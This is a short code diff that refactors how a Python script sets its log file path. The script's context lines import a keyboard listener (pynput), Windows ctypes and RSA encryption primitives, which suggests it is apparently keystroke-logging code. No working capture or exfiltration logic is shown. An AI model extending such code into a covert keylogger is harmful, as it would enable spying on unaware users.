@@ -23,9 +23,8 @@ from cryptography.hazmat.primitives.asymmetric import padding, rsa
 
 if platform.system() == 'Windows':
     import ctypes
-    LOG = os.path.join(sys.path[0], 'log.log')
-else:
-    LOG = os.path.join(sys.path[0], 'log.log')
+
+LOG = os.path.join(sys.path[0], 'log.log')
 
 try:
     from pynput.keyboard import Listener
